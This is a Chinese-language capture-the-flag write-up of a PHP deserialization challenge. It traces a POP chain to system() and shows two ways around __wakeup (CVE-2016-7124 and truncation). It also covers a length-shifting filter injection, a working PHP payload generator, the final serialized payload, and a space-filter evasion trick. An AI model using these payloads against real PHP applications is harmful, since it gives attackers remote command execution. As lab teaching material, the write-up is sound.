# 极客大挑战（SYC） · Geek_Challenge2026（PHP 反序列化 ez_pop）

> 环境：ctfplus 动态实例，Apache/2.4.10 (Debian)，老版本 PHP
> 日期：2026-10-23（本地）→ 2026-10-24（目标补测）
> 状态：已完成
> flag：`SYC{982513ca-51c1-4244-981a-15c2f921acf1}}`
>
> 说明：`/flag` 文件原文末尾是**两个右花括号**（base64 验证 hex 为 `7d 7d 0a`）。如果平台只收单括号，备用 `SYC{982513ca-51c1-4244-981a-15c2f921acf1}`；先提交原文。

## 一、源码结构

入口只有一处：

```php
if (isset($_GET['user']) && isset($_GET['sign'])) {
    $entry = new A($_GET['user'], $_GET['sign']);
    $ser = serialize($entry);
    $escaped = filter($ser);   // str_replace("admin", "hacker", $data)
    unserialize($escaped);
}
```

六个类各有一个魔术方法，刚好串成一条链：

| 类 | 魔术方法 | 关键行为 |
|---|---|---|
| A | `__destruct` | `echo $this->sign`，对象会被转字符串 |
| B | `__wakeup` | 把 `action` 置空，**拦路虎** |
| B | `__toString` | `action` 可调用时执行 `$func()` |
| C | `__invoke` | `target` 有 `__call` 且方法不存在时，调 `$target->$method()` |
| D | `__call` | 返回 `$next->$property`，触发 `__get` |
| E | `__get` | `sink instanceof F` 时，写 `$sink->flag_trigger = $cmd` |
| F | `__set` | `flag_trigger` 赋值时 `system($value)` |

终点是 `F::__set` 的 `system($value)`，所以整题是「从 sink 倒推 POP 链 + 绕过 `__wakeup`」。

## 二、POP 链

从终点往回推：

| 跳 | 触发点 | 要满足的条件 | 下一跳 |
|---|---|---|---|
| 1 | `A::__destruct` | `sign` 是对象 | `B::__toString` |
| 2 | `B::__toString` | `action` 是对象且有 `__invoke` | `C::__invoke` |
| 3 | `C::__invoke` | `target` 有 `__call`，`method` 不存在 | `D::__call` |
| 4 | `D::__call` | `next` 是对象，`property` 是字符串 | `E::__get` |
| 5 | `E::__get` | `sink` 是 `F` 实例 | `F::__set` |
| 6 | `F::__set` | `name === 'flag_trigger'` | `system($value)` |

对象图：

```php
$f = new F();

$e = new E();
$e->sink = $f;
$e->cmd  = 'cat</flag';

$d = new D();
$d->next = $e;
$d->property = 'x';

$c = new C();
$c->target = $d;
$c->method = 'x';

$b = new B();
$b->action = $c;
```

两个「必须不存在」：

- `C->method = 'x'`：D 没有 `x()`，才会触发 `D::__call`。
- `D->property = 'x'`：E 没有 `x` 属性，才会触发 `E::__get`。

## 三、拦路虎：B::__wakeup

正常 `unserialize` 的顺序是：

```text
解析属性 -> B::__wakeup -> action = null -> A::__destruct
```

`action` 被清空后，`B::__toString` 直接 return，链断。

有两条路让 `__wakeup` 晚于析构：

| 方法 | 写法 | 适用 | 目标结果 |
|---|---|---|---|
| 截断/解析失败 | `O:1:"B":1:{...;`（少一个 `}`） | PHP 7.4 / 8.x | **失败** |
| 属性数量不匹配 | `O:1:"B":2:{...;}`（声明 2，实际 1） | 老 PHP（CVE-2016-7124） | **成功** |

目标是 `Apache/2.4.10 (Debian)` 的老 PHP，所以最后用的是**属性数量版**。

### 3.1 截断法（本地 PHP 8.x）

把 `serialize($b)` 末尾的 `}` 删掉，塞进 A：

```php
$s = 'O:1:"A":1:{s:4:"sign";O:1:"B":1:{s:6:"action";...;';
@unserialize($s);
```

解析在 B 内部失败，B 的 `}` 还没读到，`__wakeup` 没执行；失败清理时 A 析构，`A->sign` 已经指向 B，链先跑，`__wakeup` 最后才被调用。

本地 PHP 8.2 输出顺序：

```text
A::__destruct
B::__toString
C::__invoke
D::__call
E::__get
RCE: ...
B::__wakeup
```

### 3.2 属性数量法（目标老 PHP）

`serialize($b)` 原始头：

```text
O:1:"B":1:{s:6:"action";O:1:"C":...;}
```

改成：

```text
O:1:"B":2:{s:6:"action";O:1:"C":...;}
```

声明 2 个属性，实际只给 1 个。老 PHP 的属性数量检查会直接跳过 `__wakeup`，`action` 保留 C，链就能跑。

目标实测：

```text
?id=1...（属性数量版） -> uid=33(www-data)
```

而截断版在目标上先输出：

```text
唉？你怎么醒了
```

说明目标老 PHP 的失败清理顺序是 `__wakeup` 先于 `__destruct`，截断法不适用。

## 四、filter 的长度把戏

线上不能直接交「少一个 `}`」的串，因为 `serialize(new A($u,$s))` 永远合法。破局点在：

```php
$escaped = str_replace("admin", "hacker", $ser);
```

`serialize` 写字符串：

```text
s:<len>:"内容";
```

`<len>` 是**替换前**长度。`admin` 5 字节变 `hacker` 6 字节，实际内容长 1，但 `<len>` 不变。

`unserialize` 只读 `<len>` 字节，于是实际内容末尾多出来的字节会被当成**序列化语法**。

### 4.1 注入到 user，不要注入 sign

A 只声明 2 个属性：

```text
第 1 个：user
第 2 个：sign
```

在 `user` 里提前闭合，注入的 `sign` 正好是第 2 个属性，A 的属性计数满足。

如果注入到 `sign` 后面，A 已经读满 2 个属性，第 3 个属性不被接受，B 根本不会被创建。目标上实测 sign 注入失败，只输出一长串 `hacker...`。

### 4.2 注入块

```php
$inject = '";s:4:"sign";' . $b_ser;
```

拆开：

```text
"                 闭合 user 字符串
;                 结束 user 属性
s:4:"sign";       第 2 个属性名
O:1:"B":2:{...}   第 2 个属性值，B 声明 2 个属性
```

### 4.3 长度对齐

设：

```text
N = strlen($inject)
```

`user` 构造：

```php
$user = str_repeat('admin', N) . $inject;
```

- 序列化时长度 = `5N + N = 6N`；
- filter 后 `admin × N` 变 `hacker × N` = `6N`，再加注入块 `N`，实际 `7N`；
- `unserialize` 读 `6N` 字节，正好读完 `hacker × N`；
- 剩下 `N` 字节正好是 `$inject`。

N 必须严格等于注入块长度：

- N 小 → 解析器吃掉注入块开头，错位；
- N 大 → 停在 `hacker` 中间，错位。

## 五、最终 payload

B 用属性数量版，完整闭合，不截断：

```text
O:1:"B":2:{s:6:"action";O:1:"C":2:{s:6:"target";O:1:"D":2:{s:4:"next";O:1:"E":2:{s:4:"sink";O:1:"F":0:{}s:3:"cmd";s:9:"cat</flag";}s:8:"property";s:1:"x";}s:6:"method";s:1:"x";}}
```

`$inject`：

```text
";s:4:"sign";O:1:"B":2:{...}
```

`user`：

```text
admin × N + $inject
```

`sign=x` 只是占位，真正的 `A->sign` 是注入的 B。

### 5.1 生成器

```php
<?php
class B { public $action; }
class C { public $target; public $method; }
class D { public $next; public $property; }
class E { public $sink; public $cmd; }
class F {}

$cmd = $argv[1] ?? 'cat</flag';

$f = new F();

$e = new E();
$e->sink = $f;
$e->cmd  = $cmd;

$d = new D();
$d->next = $e;
$d->property = 'x';

$c = new C();
$c->target = $d;
$c->method = 'x';

$b = new B();
$b->action = $c;

$b_ser = serialize($b);
$b_ser = 'O:1:"B":2:' . substr($b_ser, strlen('O:1:"B":1:'));

$inject = '";s:4:"sign";' . $b_ser;
$user = str_repeat('admin', strlen($inject)) . $inject;

echo 'user=' . urlencode($user) . '&sign=x' . PHP_EOL;
```

### 5.2 为什么 F 用空类

```php
class F {}
```

序列化：

```text
O:1:"F":0:{}
```

如果保留：

```php
class F { private $flag_trigger; }
```

会输出：

```text
O:1:"F":1:{s:15:"\0F\0flag_trigger";N;}
```

里面有真实 NUL 字节，URL 里是 `%00`，容易被服务器/WAF 截断，长度也变长（216 vs 190）。

目标端的 F 仍有 `private $flag_trigger`，默认 null；E 从类外写它，访问不到私有属性，照样触发 `__set`。`O:1:"F":0:{}` 完全够用。

## 六、目标结果

核心用了 5 次请求（另有 1 次 `sign` 注入验证）：

| # | 请求 | 结果 |
|---|---|---|
| 1 | 基线 `/` | 页面正常 |
| 2 | 截断版 `id` | 先输出 `唉？你怎么醒了`，失败 |
| 3 | 属性数量版 `id` | `uid=33(www-data) gid=33(www-data) groups=33(www-data)` |
| 4 | 属性数量版 `cat</flag` | 拿到 flag |
| 5 | 属性数量版 `base64</flag` | 验证 `/flag` 原始字节 |

> 另 1 次 `sign` 注入验证：`?user=x&sign=...` 只输出 `hacker...` 和原始 sign，B 没有被创建；确认注入点只能是 `user`，不能是 `sign`。

`/flag` 原文：

```text
SYC{982513ca-51c1-4244-981a-15c2f921acf1}}
```

末尾两个 `}`（hex `7d 7d 0a`）。备用单括号：

```text
SYC{982513ca-51c1-4244-981a-15c2f921acf1}
```

## 七、踩过的坑

| 坑 | 现象 | 原因 / 解决 |
|---|---|---|
| 截断版在目标失败 | `唉？你怎么醒了` 先出现 | 目标老 PHP 清理顺序是先 `__wakeup`；改用属性数量版 |
| 属性数量版在本地 8.2 失败 | `unserialize()` 返回 `false` | CVE 只在老 PHP 有效；本地用截断法验证链 |
| 注入到 `sign` | 一长串 `hackerhacker...` | A 只认 2 个属性，第三个被拒；改注入 `user` |
| 用 `abc` 替代 `admin` | 没有长度差，`blocked`/无注入 | filter 只识别 `admin`，每个 +1 字节 |
| 注入块里出现 `admin` | 长度又被替换 | 注入块里不能有 `admin` |
| 手写 F 的 private 属性名 | `s:15:"Fflag_trigger"` 解析错位 | NUL 丢失；用 `O:1:"F":0:{}` |
| `admin` 数量不对 | 解析器停在 hacker 中间或吃掉注入块 | N 必须等于 `strlen($inject)` |
| 命令带空格被拦 | 无回显 | 用 `cat</flag`、`tac`、`nl`，或 `%09` |

## 八、可复用的方法

1. **POP 链从 sink 倒推**：先找 `system` / `file_get_contents` 这类终点，再问「谁调用它」「谁调用谁」，一直倒推到 `__destruct` / `__toString`。
2. **`__wakeup` 不一定要绕过**：属性数量不匹配、解析失败清理，都是让它在链之后执行/不执行。
3. **两条绕过要分版本**：属性数量（CVE-2016-7124）只对老 PHP；截断/失败清理在 PHP 7.4/8.x 更常见。先本地确认版本行为，再上目标。
4. **`serialize` 的长度字段是信任边界**：先序列化、再对字符串做改变长度的替换，就可能被注入。
5. **属性计数也是约束**：注入的属性必须卡在目标对象声明的属性数量内。
6. **private 属性名里的 NUL**：能用空类/默认值绕开，就不要手写 `\0Class\0prop`。

## 附：属性数量 vs 截断

| | 属性数量版 | 截断版 |
|---|---|---|
| B 的写法 | `O:1:"B":2:{...;}`（声明 2，实际 1） | `O:1:"B":1:{...;`（少一个 `}`） |
| 原理 | 老 PHP 属性数量检查跳过 `__wakeup` | 解析在 B 内失败，`__wakeup` 推迟 |
| 适用 | PHP < 5.6.25 / < 7.0.10 | PHP 7.4 / 8.x |
| 目标 | **成功** | 失败（wakeup 先跑） |
| 本地 8.2 | 返回 `false` | 成功 |

两条路的共同点：**让 `__wakeup` 晚于 `A::__destruct`**。
